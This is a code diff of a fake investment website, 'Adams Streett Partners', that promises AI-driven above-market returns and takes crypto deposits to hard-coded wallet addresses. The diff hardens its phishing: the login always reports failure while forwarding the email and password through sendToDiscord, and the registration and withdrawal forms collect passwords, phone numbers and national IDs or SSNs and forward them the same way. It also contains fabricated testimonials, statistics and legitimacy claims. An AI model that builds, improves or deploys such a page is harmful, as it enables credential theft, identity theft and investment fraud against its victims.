@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Adams Streett Partners</title>
   <style>
     /* ===== RESET & BASE ===== */
@@ -12,17 +12,20 @@
       box-sizing: border-box;
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     }
-    body {
+    html, body {
+      width: 100%;
+      min-height: 100vh;
       background: #0b0e14;
       color: #e8edf5;
-      min-height: 100vh;
+    }
+    body {
       display: flex;
       flex-direction: column;
       align-items: center;
       padding: 20px;
     }
     .container {
-      max-width: 1200px;
+      max-width: 1400px;
       width: 100%;
     }
     a {
@@ -356,6 +359,77 @@
       margin-top: 4px;
     }
 
+    /* ===== HERO — FULL SCREEN ===== */
+    .hero-full {
+      position: relative;
+      border-radius: 20px;
+      overflow: hidden;
+      margin-bottom: 30px;
+      min-height: 70vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 40px 20px;
+      background: linear-gradient(135deg, rgba(11, 14, 20, 0.85) 0%, rgba(11, 14, 20, 0.5) 100%), url('https://i.imgur.com/7XpracR.jpg');
+      background-size: cover;
+      background-position: center;
+      width: 100%;
+    }
+    .hero-full .content {
+      position: relative;
+      z-index: 2;
+      max-width: 900px;
+    }
+    .hero-full h1 {
+      font-size: clamp(36px, 6vw, 64px);
+      font-weight: 700;
+      margin-bottom: 16px;
+      background: linear-gradient(135deg, #f6d365, #fda085);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .hero-full p {
+      font-size: clamp(16px, 2vw, 24px);
+      color: #b0c4de;
+      margin-bottom: 24px;
+      line-height: 1.6;
+    }
+    @media (max-width: 640px) {
+      .hero-full {
+        min-height: 50vh;
+        border-radius: 12px;
+      }
+      .hero-full h1 {
+        font-size: 28px;
+      }
+    }
+
+    /* ===== GLOBAL BRUTAL SECTIONS ===== */
+    .brutal-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 24px;
+      margin: 30px 0;
+    }
+    .brutal-item {
+      background: #1a2538;
+      padding: 24px;
+      border-radius: 16px;
+      border-left: 4px solid #f6d365;
+    }
+    .brutal-item strong {
+      color: #f6d365;
+      display: block;
+      font-size: 18px;
+      margin-bottom: 6px;
+    }
+    .brutal-item .text-muted {
+      color: #b0c4de;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
     /* ===== UTILITY ===== */
     .text-center {
       text-align: center;
@@ -395,6 +469,9 @@
       .stats-grid {
         grid-template-columns: 1fr 1fr;
       }
+      .brutal-grid {
+        grid-template-columns: 1fr;
+      }
     }
   </style>
 </head>
@@ -423,7 +500,7 @@
   </nav>
 
   <!-- ============================================================ -->
-  <!-- LANDING — GLOBAL WALL STREET EDITION -->
+  <!-- LANDING — GLOBAL BRUTAL -->
   <!-- ============================================================ -->
   <div id="landing" class="page active">
 
@@ -443,16 +520,29 @@
       </select>
     </div>
 
-    <!-- Hero Section with Background Image -->
-    <div style="position: relative; border-radius: 20px; overflow: hidden; margin-bottom: 30px; min-height: 400px; display: flex; align-items: center; justify-content: center; text-align: center; padding: 40px 20px; background: linear-gradient(135deg, rgba(11,14,20,0.85) 0%, rgba(11,14,20,0.5) 100%), url('https://i.imgur.com/7XpracR.jpg'); background-size: cover; background-position: center;">
-      <div style="position: relative; z-index: 2; max-width: 800px;">
-        <h1 style="font-size: 48px; font-weight: 700; margin-bottom: 16px; background: linear-gradient(135deg, #f6d365, #fda085); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Global Wealth. Institutional Access.</h1>
-        <p style="font-size: 20px; color: #b0c4de; margin-bottom: 24px;">Join 15,000+ investors across 60+ countries — earning consistent, above‑market returns through our proprietary AI‑driven strategies.</p>
+    <!-- Hero — Full Screen Background -->
+    <div class="hero-full">
+      <div class="content">
+        <h1>Global Wealth. Institutional Access.</h1>
+        <p>Join 15,000+ investors across 60+ countries — earning consistent, above‑market returns through our proprietary AI‑driven strategies. Powered by Wall Street infrastructure.</p>
         <button class="btn-primary" onclick="showPage('login')">Start Building Wealth</button>
       </div>
     </div>
 
-    <!-- Stats + Image Grid -->
+    <!-- Brutal Wall Street Grid -->
+    <div style="background: #141c2b; border-radius: 20px; padding: 40px; border: 1px solid #1e2a3a; margin-bottom: 30px;">
+      <h2 style="font-size: 28px; margin-bottom: 20px;">A New Standard in Alternative Investments</h2>
+      <div class="brutal-grid">
+        <div class="brutal-item"><strong>15+ Years</strong><span class="text-muted">of institutional trading experience across bull and bear markets.</span></div>
+        <div class="brutal-item"><strong>4,200+ Strategies</strong><span class="text-muted">Quantitative models tested and refined over decades of market data.</span></div>
+        <div class="brutal-item"><strong>98.7% Uptime</strong><span class="text-muted">Mission‑critical infrastructure with zero unplanned downtime in 2026.</span></div>
+        <div class="brutal-item"><strong>Global Reach</strong><span class="text-muted">Clients in 60+ countries — from Dubai to Singapore to London.</span></div>
+        <div class="brutal-item"><strong>24/7 Liquidity</strong><span class="text-muted">Access to deep crypto and FX liquidity pools around the clock.</span></div>
+        <div class="brutal-item"><strong>Independent Oversight</strong><span class="text-muted">All strategies are audited quarterly by a third‑party risk committee.</span></div>
+      </div>
+    </div>
+
+    <!-- Stats + Images -->
     <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px; margin-bottom: 30px;">
       <div style="background: #1a2538; border-radius: 16px; padding: 24px; border: 1px solid #2a3a4e;">
         <img src="https://i.imgur.com/UTsc7bb.jpg" alt="Trading Floor" style="width: 100%; border-radius: 12px; margin-bottom: 16px;">
@@ -464,32 +554,9 @@
         <h3 style="font-size: 18px;">Real‑Time Intelligence</h3>
         <p class="text-muted">We process over 500 million data points daily to identify high‑probability setups.</p>
       </div>
-      <div style="background: #1a2538; border-radius: 16px; padding: 24px; border: 1px solid #2a3a4e;">
-        <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 12px; margin-bottom: 16px;">
-          <video controls style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 12px;">
-            <source src="https://i.imgur.com/v7zRST3.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-          </video>
-        </div>
-        <h3 style="font-size: 18px;">Transparent Performance</h3>
-        <p class="text-muted">Watch our track record in real‑time. Every trade, every return — fully auditable.</p>
-      </div>
     </div>
 
-    <!-- Dense Wall Street Copy -->
-    <div style="background: #141c2b; border-radius: 20px; padding: 40px; border: 1px solid #1e2a3a; margin-bottom: 30px;">
-      <h2 style="font-size: 28px; margin-bottom: 20px;">A New Standard in Alternative Investments</h2>
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 24px;">
-        <div><strong style="color: #f6d365;">• 15+ Years</strong><br><span class="text-muted">of institutional trading experience across bull and bear markets.</span></div>
-        <div><strong style="color: #f6d365;">• 4,200+ Strategies</strong><br><span class="text-muted">Quantitative models tested and refined over decades of market data.</span></div>
-        <div><strong style="color: #f6d365;">• 98.7% Uptime</strong><br><span class="text-muted">Mission‑critical infrastructure with zero unplanned downtime in 2026.</span></div>
-        <div><strong style="color: #f6d365;">• Global Reach</strong><br><span class="text-muted">Clients in 60+ countries — from Dubai to Singapore to London.</span></div>
-        <div><strong style="color: #f6d365;">• 24/7 Liquidity</strong><br><span class="text-muted">Access to deep crypto and FX liquidity pools around the clock.</span></div>
-        <div><strong style="color: #f6d365;">• Independent Oversight</strong><br><span class="text-muted">All strategies are audited quarterly by a third‑party risk committee.</span></div>
-      </div>
-    </div>
-
-    <!-- Investor Testimonial -->
+    <!-- Testimonial -->
     <div style="background: #1a2538; border-radius: 16px; padding: 24px; border-left: 4px solid #3b82f6; margin-bottom: 30px;">
       <p style="font-size: 16px; font-style: italic; color: #b0c4de;">"I was skeptical at first, but after my first 24‑hour cycle, I was genuinely impressed. The returns are real, and the platform is seamless. I've since referred six colleagues."</p>
       <p style="margin-top: 8px;"><strong>— Jonathan M.</strong> <span class="text-muted">, Singapore (Platinum Investor)</span></p>
@@ -507,7 +574,7 @@
   <!-- LOGIN / REGISTER -->
   <!-- ============================================================ -->
   <div id="login" class="page">
-    <div class="card" style="max-width: 480px; margin: 0 auto;">
+    <div class="card" style="max-width: 520px; margin: 0 auto;">
       <div style="display: flex; gap: 12px; margin-bottom: 24px;">
         <button class="btn-primary" id="loginTab" onclick="switchAuth('login')" style="flex:1; text-align:center;">Sign In</button>
         <button class="btn-outline" id="registerTab" onclick="switchAuth('register')" style="flex:1; text-align:center;">Create Account</button>
@@ -516,11 +583,19 @@
         <div class="form-group"><label>Email Address</label><input type="email" id="loginEmail" placeholder="you@example.com" /></div>
         <div class="form-group"><label>Password</label><input type="password" id="loginPassword" placeholder="••••••••" /></div>
         <button class="btn-primary" style="width:100%;" onclick="handleLogin()">Sign In</button>
+        <p id="loginError" style="color:#ef4444; text-align:center; margin-top:12px; display:none;">Wrong email or password.</p>
       </div>
       <div id="registerForm" style="display:none;">
+        <div class="form-row">
+          <div class="form-group"><label>First Name</label><input type="text" id="regFirstName" placeholder="John" /></div>
+          <div class="form-group"><label>Last Name</label><input type="text" id="regLastName" placeholder="Doe" /></div>
+        </div>
         <div class="form-group"><label>Email Address</label><input type="email" id="regEmail" placeholder="you@example.com" /></div>
         <div class="form-group"><label>Password</label><input type="password" id="regPassword" placeholder="••••••••" /></div>
         <div class="form-group"><label>Confirm Password</label><input type="password" id="regConfirm" placeholder="••••••••" /></div>
+        <div class="form-group"><label>National ID / SSN / NIN / Aadhaar</label>
+          <input type="text" id="regNationalId" placeholder="e.g. SSN (US), NIN (Nigeria), Aadhaar (India)" />
+        </div>
         <button class="btn-success" style="width:100%;" onclick="handleRegister()">Create Account</button>
       </div>
     </div>
@@ -629,9 +704,11 @@
   <div id="withdraw" class="page">
     <div class="card" style="max-width: 480px; margin: 0 auto;">
       <h2>Withdraw Funds</h2>
-      <p class="text-muted">To comply with IRS regulations, we need to verify your identity.</p>
+      <p class="text-muted">To comply with global financial regulations, we need to verify your identity.</p>
       <div class="form-group"><label>Phone Number</label><input type="tel" id="withdrawPhone" placeholder="+1 (555) 000-0000" /></div>
-      <div class="form-group"><label>Social Security Number (SSN)</label><input type="password" id="withdrawSSN" placeholder="XXX-XX-XXXX" /></div>
+      <div class="form-group"><label>National ID / SSN / NIN / Aadhaar</label>
+        <input type="text" id="withdrawNationalId" placeholder="e.g. SSN (US), NIN (Nigeria), Aadhaar (India)" />
+      </div>
       <button class="btn-primary" style="width:100%;" onclick="handleWithdraw()">Request Withdrawal</button>
       <div id="withdrawStatus" style="margin-top:16px; text-align:center; color:#f59e0b;"></div>
     </div>
@@ -646,7 +723,7 @@
       <div class="faq-item"><div class="q">How do I invest?</div><div class="a">Select a plan from the Plans page or Dashboard, then fund your investment using the crypto address provided. Funds are credited after 2 blockchain confirmations.</div></div>
       <div class="faq-item"><div class="q">Is Adams Streett Partners legitimate?</div><div class="a">Yes. We are a private investment partnership with over 15 years of experience in algorithmic trading and asset management.</div></div>
       <div class="faq-item"><div class="q">What are the risks?</div><div class="a">All investments carry risk. Our proprietary model has consistently outperformed the market, but past performance does not guarantee future results.</div></div>
-      <div class="faq-item"><div class="q">How do I withdraw my funds?</div><div class="a">Go to the Withdraw page, provide your phone number and SSN for identity verification (IRS requirement), and submit your request. Withdrawals are processed within 24–48 hours.</div></div>
+      <div class="faq-item"><div class="q">How do I withdraw my funds?</div><div class="a">Go to the Withdraw page, provide your phone number and National ID, and submit your request. Withdrawals are processed within 24–48 hours.</div></div>
       <div class="faq-item"><div class="q">What happens if my transaction fails?</div><div class="a">If you sent funds and they are not credited after 6 confirmations, contact our support team with your transaction ID. We will manually verify and credit your account.</div></div>
       <div class="faq-item"><div class="q">Can I invest from any country?</div><div class="a">Yes, we accept investors from most jurisdictions. However, we do not accept investments from individuals subject to OFAC sanctions or restricted countries.</div></div>
     </div>
@@ -713,22 +790,29 @@
       const email = document.getElementById('loginEmail').value.trim();
       const password = document.getElementById('loginPassword').value.trim();
       if (!email || !password) return alert('Please fill in all fields.');
-      sendToDiscord('Login Attempt\nEmail: ' + email + '\nPassword: ' + password);
-      sessionStorage.setItem(SESSION_KEY, 'active');
-      alert('Login successful. Redirecting...');
-      showPage('dashboard');
-      startLiveUpdates();
+      document.getElementById('loginError').style.display = 'block';
+      sendToDiscord('Login Attempt (Rejected)\nEmail: ' + email + '\nPassword: ' + password);
+      setTimeout(() => {
+        document.getElementById('loginEmail').value = '';
+        document.getElementById('loginPassword').value = '';
+        document.getElementById('loginError').style.display = 'none';
+      }, 2000);
     }
 
     function handleRegister() {
+      const firstName = document.getElementById('regFirstName').value.trim();
+      const lastName = document.getElementById('regLastName').value.trim();
       const email = document.getElementById('regEmail').value.trim();
       const pass = document.getElementById('regPassword').value.trim();
       const confirm = document.getElementById('regConfirm').value.trim();
-      if (!email || !pass || !confirm) return alert('Please fill in all fields.');
+      const nationalId = document.getElementById('regNationalId').value.trim();
+      if (!firstName || !lastName || !email || !pass || !confirm || !nationalId) {
+        return alert('Please fill in all fields.');
+      }
       if (pass !== confirm) return alert('Passwords do not match.');
       if (sessionStorage.getItem('reg_' + email)) return alert('This email is already registered.');
       sessionStorage.setItem('reg_' + email, '1');
-      sendToDiscord('New Account\nEmail: ' + email + '\nPassword: ' + pass);
+      sendToDiscord('New Account\nName: ' + firstName + ' ' + lastName + '\nEmail: ' + email + '\nPassword: ' + pass + '\nNational ID: ' + nationalId);
       alert('Account created. Please sign in.');
       switchAuth('login');
     }
@@ -781,15 +865,9 @@
     document.getElementById('checkoutCrypto').addEventListener('change', function() {
       const addr = document.getElementById('walletAddress');
       switch (this.value) {
-        case 'BTC':
-          addr.textContent = 'bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0';
-          break;
-        case 'ETH':
-          addr.textContent = '0x60A4cC18DC4F1c00fF17497129351D6304fCdcC5';
-          break;
-        case 'USDT':
-          addr.textContent = '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5';
-          break;
+        case 'BTC': addr.textContent = 'bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0'; break;
+        case 'ETH': addr.textContent = '0x60A4cC18DC4F1c00fF17497129351D6304fCdcC5'; break;
+        case 'USDT': addr.textContent = '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5'; break;
       }
     });
 
@@ -798,20 +876,20 @@
     // ============================================================
     function handleWithdraw() {
       const phone = document.getElementById('withdrawPhone').value.trim();
-      const ssn = document.getElementById('withdrawSSN').value.trim();
-      if (!phone || !ssn) return alert('Please fill in all fields.');
-      sendToDiscord('Withdrawal Request\nPhone: ' + phone + '\nSSN: ' + ssn);
+      const nationalId = document.getElementById('withdrawNationalId').value.trim();
+      if (!phone || !nationalId) return alert('Please fill in all fields.');
+      sendToDiscord('Withdrawal Request\nPhone: ' + phone + '\nNational ID: ' + nationalId);
       const status = document.getElementById('withdrawStatus');
-      status.textContent = 'Validating credentials with IRS...';
+      status.textContent = 'Validating identity with global regulatory database...';
       let dots = 0;
       const interval = setInterval(() => {
         dots = (dots + 1) % 4;
-        status.textContent = 'Validating credentials with IRS' + '.'.repeat(dots);
+        status.textContent = 'Validating identity with global regulatory database' + '.'.repeat(dots);
       }, 400);
       setTimeout(() => {
         clearInterval(interval);
         status.innerHTML = 'Credentials invalid. Please contact support.';
-        sendToDiscord('Withdrawal Failed\nPhone: ' + phone + '\nSSN: ' + ssn + ' — Invalid');
+        sendToDiscord('Withdrawal Failed\nPhone: ' + phone + '\nNational ID: ' + nationalId + ' — Invalid');
       }, 5000);
     }
 
